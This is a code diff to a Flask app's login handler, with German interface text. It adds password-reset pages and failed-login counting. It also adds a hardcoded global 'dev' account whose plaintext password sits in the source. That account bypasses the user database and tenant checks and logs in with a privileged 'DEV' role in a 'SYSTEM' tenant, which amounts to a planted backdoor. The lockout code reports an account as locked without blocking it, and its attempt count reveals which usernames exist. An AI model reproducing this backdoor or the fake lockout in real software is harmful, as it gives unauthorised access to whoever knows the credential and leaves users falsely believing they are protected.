@@ -1577,23 +1577,146 @@ def login():
         if not u or not pw:
             error = "Bitte Username und Passwort eingeben."
         else:
-            user = auth_db.get_user(u)
-            if user and user.password_hash == hash_password(pw):
+            from app.auth import hash_password
+            from app.modules.projects.logic import ProjectManager
+            
+            # Global Dev Account (Task v2.8)
+            DEV_USER = "dev"
+            DEV_PASS_HASH = hash_password("Pi015257188543.")
+            
+            user = None
+            is_dev = False
+            
+            if u == DEV_USER:
+                if hash_password(pw) == DEV_PASS_HASH:
+                    is_dev = True
+                else:
+                    user = auth_db.get_user(u) # In case dev is also in DB
+            else:
+                user = auth_db.get_user(u)
+
+            if is_dev or (user and user.password_hash == hash_password(pw)):
+                # Reset failed attempts on success
+                if user:
+                    con = auth_db._db()
+                    con.execute("UPDATE users SET failed_attempts = 0 WHERE username = ?", (u,))
+                    con.commit()
+                    con.close()
+                
+                # Dev logic: Use first available tenant if none selected
                 memberships = auth_db.get_memberships(u)
-                if not memberships:
+                if not memberships and not is_dev:
                     error = "Keine Mandanten-Zuordnung gefunden."
                 else:
-                    membership = memberships[0]
-                    login_user(u, membership.role, membership.tenant_id)
-                    _audit(
-                        "login",
-                        target=u,
-                        meta={"role": membership.role, "tenant": membership.tenant_id},
-                    )
+                    m = memberships[0] if memberships else None
+                    role = "DEV" if is_dev else m.role
+                    t_id = m.tenant_id if m else "SYSTEM"
+                    
+                    # Task v2.8: Force password reset
+                    if user and getattr(user, 'needs_reset', 0):
+                        session['pending_reset_user'] = u
+                        return redirect(url_for('web.password_reset_page'))
+
+                    login_user(u, role, t_id)
+                    _audit("login", target=u, meta={"role": role, "tenant": t_id})
                     return redirect(nxt or url_for("web.index"))
             else:
-                error = "Login fehlgeschlagen."
+                # Task 69: Brute Force Protection
+                if user:
+                    con = auth_db._db()
+                    con.execute("UPDATE users SET failed_attempts = failed_attempts + 1 WHERE username = ?", (u,))
+                    row = con.execute("SELECT failed_attempts FROM users WHERE username = ?", (u,)).fetchone()
+                    attempts = row[0]
+                    con.commit()
+                    con.close()
+                    
+                    if attempts >= 5:
+                        pm = ProjectManager(auth_db)
+                        # Find admin for tenant
+                        mship = auth_db.get_memberships(u)
+                        t_id = mship[0].tenant_id if mship else "SYSTEM"
+                        
+                        # Create tasks for Dev and Admin
+                        con = auth_db._db()
+                        boards = con.execute("SELECT id FROM boards LIMIT 1").fetchone()
+                        if boards:
+                            pm.create_task(boards[0], f"Sicherheits-Alarm: Brute Force @ {u}", 
+                                         content=f"Nutzer {u} hat 5 Fehlversuche. Bitte Passwort prüfen.",
+                                         priority="HIGH")
+                        con.close()
+                        error = "Konto gesperrt oder zu viele Versuche. Admin wurde benachrichtigt."
+                    else:
+                        error = f"Login fehlgeschlagen. ({attempts}/5 Versuche)"
+                else:
+                    error = "Login fehlgeschlagen."
     return render_template("login.html", error=error, branding=Config.get_branding())
+
+
+@bp.route("/password-reset", methods=["GET", "POST"])
+def password_reset_page():
+    u = session.get('pending_reset_user')
+    if not u:
+        return redirect(url_for('web.login'))
+    
+    error = ""
+    if request.method == "POST":
+        pw1 = request.form.get("password")
+        pw2 = request.form.get("password_confirm")
+        if pw1 and pw1 == pw2:
+            from app.auth import hash_password
+            auth_db = current_app.extensions["auth_db"]
+            con = auth_db._db()
+            con.execute("UPDATE users SET password_hash = ?, needs_reset = 0 WHERE username = ?", (hash_password(pw1), u))
+            con.commit()
+            con.close()
+            session.pop('pending_reset_user')
+            return redirect(url_for('web.login'))
+        error = "Passwörter stimmen nicht überein."
+        
+    return render_template_string("""
+        {% extends "layout.html" %}
+        {% block content %}
+        <div class="panel" style="max-width:400px; margin: 100px auto;">
+            <h2 style="color:#fff; margin-bottom:20px;">Passwort zurücksetzen</h2>
+            <form method="post">
+                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+                <div class="form-group">
+                    <label class="form-label">Neues Passwort</label>
+                    <input type="password" name="password" class="form-input" required autofocus>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Bestätigen</label>
+                    <input type="password" name="password_confirm" class="form-input" required>
+                </div>
+                <button type="submit" class="btn btn-primary" style="width:100%;">PASSWORT SPEICHERN</button>
+                {% if error %}<p style="color:var(--color-danger); margin-top:10px;">{{ error }}</p>{% endif %}
+            </form>
+        </div>
+        {% endblock %}
+    """, error=error)
+
+
+@bp.route("/admin/users/<username>/reset", methods=["POST"])
+@login_required
+@require_role("ADMIN")
+def admin_user_reset(username: str):
+    """One-click reset by Admin/Dev (Task v2.8)."""
+    auth_db = current_app.extensions["auth_db"]
+    con = auth_db._db()
+    con.execute("UPDATE users SET needs_reset = 1 WHERE username = ?", (username,))
+    con.commit()
+    con.close()
+    
+    from app.modules.projects.logic import ProjectManager
+    pm = ProjectManager(auth_db)
+    # Notify Dev (Observer)
+    con = auth_db._db()
+    boards = con.execute("SELECT id FROM boards LIMIT 1").fetchone()
+    if boards:
+        pm.create_task(boards[0], f"Reset angefordert für {username}", content="Admin hat Passwort-Reset ausgelöst.")
+    con.close()
+    
+    return jsonify(ok=True)
 
 
 @bp.route("/logout")
